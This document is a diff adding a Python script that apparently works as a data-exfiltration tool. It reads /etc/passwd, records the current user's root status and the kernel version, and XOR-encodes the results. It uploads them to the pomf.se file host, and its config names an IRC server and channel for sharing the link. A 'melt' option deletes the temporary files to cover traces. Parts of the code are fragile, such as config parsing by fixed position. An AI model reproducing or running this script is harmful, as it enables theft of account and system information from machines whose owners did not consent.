@@ -1,0 +1,98 @@
+#!/usr/bin/python
+
+import os
+import re
+import subprocess
+import sys
+from itertools import cycle
+import base64
+import time
+import socket
+import random
+import string
+try:
+    import requests
+except Exception:
+    print("Install python3-requests")
+
+config = "config.pomf"
+
+if not os.path.exists(os.getcwd() + "/" + config):
+    open(config, "w").write("""file-name(s)=/etc/passwd #use comma to seperate names
+file-log=true #changing this value to false will only log data client-side
+user-perms=true #log the logged in user's current perms
+linux-ver=true #log the machine's Linux kernel version
+cur-dir=true #log the user's current directory
+logged-users=true #log the users currently logged in
+cur-process=true #log running processes
+xor-key=loldongs #key to use for encryption
+irc-server=hades.rdtx.eu #server to post paste to
+irc-channel=legion #channel to post paste to
+melt-switch=false #changing this to true will melt the files once completed""")
+
+def xor(data,key):
+    xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(data, cycle(key)))
+    return base64.encodestring(bytes(xored, "utf-8"))
+
+def nickgen():
+    return ''.join(random.choice(string.ascii_uppercase) for x in range(8))
+
+def main():
+    c = open(config, "r").read().split("\n")
+    c_ = ""
+    for i in c:
+        c_ += re.sub(re.compile("#.*"),"",i)
+
+    c__ = c_.split()
+    file_name = c__[0].replace("file-name(s)=", "").split(",")
+
+    file_log = c__[1].replace("file-log=", "")
+
+    if file_log == "true":
+        for i in file_name:
+            open("temp1", "w").write("{0}\n___END OF FILE___\n".format(open(i, "r").read()))
+    else:
+        print("Not logging file.")
+
+    user_perms = c__[2].replace("user-perms=","")
+
+    if user_perms == "true":
+        p = subprocess.Popen(["whoami"],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+        out,err = p.communicate()
+        if "root" in str(out):
+            a = "is root"
+        else:
+            a = "is not root"
+        open("temp2","w").write("User permission: {0} ({1})\n".format(str(out).replace("b'", "").replace(R"\n'",""),a))
+
+    linux_ver = c__[3].replace("linux-ver=","")
+    
+    if linux_ver == "true":
+        p = subprocess.Popen(["uname","-r"],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+        out,err = p.communicate()
+        open("temp2","a").write("Kernel version: {0}\n".format(str(out).replace("b'","").replace(R"\n","")))
+
+    xor_key = c__[7].replace("xor-key=","")
+
+    res = open("temp69.txt","w").write(str(xor(open("temp1","r").read() + "\n" + open("temp2","r").read(),xor_key)).strip().replace("b'","").replace(R"\n'",""))
+
+    try:
+        response = requests.post(
+                url="http://pomf.se/upload.php",
+                files={"files[]":open("temp69.txt","r")})
+    except Exception as e:
+        print("Failure:",e)
+
+    response = response.text.split('"')
+    response_text = response[17]
+    print("http://a.pomf.se/{0}".format(response_text))
+
+    melt_switch = c__[10].replace("melt-switch=","")
+
+    if melt_switch == "true":
+        os.unlink("temp1")
+        os.unlink("temp2")
+        os.unlink("temp69.txt")
+
+if __name__ == "__main__":
+    main()
